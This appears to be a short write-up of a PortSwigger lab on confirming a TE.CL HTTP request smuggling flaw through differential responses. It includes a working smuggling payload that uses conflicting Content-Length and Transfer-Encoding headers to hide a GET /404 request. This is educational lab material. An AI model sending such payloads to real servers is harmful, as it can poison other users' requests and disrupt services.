
# HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.

Note: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling/finding



![img](images/HTTP%20request%20smuggling,%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/1.png)

---------------------------------------------

It is possible to redirect to /404 using the same payload as in the example, setting the protocol to HTTP/1:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

58
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

0


```



![img](images/HTTP%20request%20smuggling,%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/2.png)